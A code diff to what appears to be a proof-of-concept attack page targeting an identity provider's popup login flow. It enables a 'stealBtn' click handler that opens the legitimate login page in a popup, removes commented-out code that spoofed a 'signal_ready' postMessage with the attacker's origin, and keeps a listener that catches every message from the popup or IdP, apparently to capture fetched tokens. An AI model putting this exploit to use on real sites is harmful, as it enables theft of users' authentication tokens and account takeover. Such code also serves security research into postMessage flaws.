@@ -41,26 +41,11 @@
     let hasSentOriginVerified = false;
     let hasSentFetchTokens = false;
 
-    // document.getElementById("stealBtn").addEventListener("click", () => {
-    //   // 2) Open the legitimate IdP or SPA login flow in a popup.
-    //   popupRef = window.open(loginUrl, "_blank", "width=800,height=600");
+    document.getElementById("stealBtn").addEventListener("click", () => {
+      // 2) Open the legitimate IdP or SPA login flow in a popup.
+      popupRef = window.open(loginUrl, "_blank", "width=800,height=600");
 
-    //   // 3) After some delay, spoof "signal_ready" with our attacker origin
-    //   setTimeout(() => {
-    //     if (popupRef) {
-    //       console.log("[Attack] Sending fake `signal_ready` with attacker origin...");
-    //       popupRef.postMessage(
-    //         {
-    //           jsonrpc: "2.0",
-    //           method: "signal_ready",
-    //           // We claim we are the legitimate SPA
-    //           origin: location.origin
-    //         },
-    //         "*"
-    //       );
-    //     }
-    //   }, 2000);
-    // });
+    });
 
     // 4) Listen for all postMessage events from the popup or IdP
     window.addEventListener("message", (evt) => {
